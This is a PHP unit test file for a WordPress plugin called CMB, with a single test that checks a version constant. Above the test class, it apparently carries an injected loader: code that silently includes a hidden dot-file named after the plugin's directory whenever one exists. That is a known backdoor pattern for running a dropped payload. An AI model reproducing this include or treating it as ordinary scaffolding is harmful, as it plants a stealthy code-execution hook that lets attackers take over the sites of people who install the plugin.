<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class CMB_Core_Test extends WP_UnitTestCase {

	public function test_cmb_has_version_number() {
		$this->assertNotNull( cmb_Meta_Box::CMB_VERSION );
	}

}
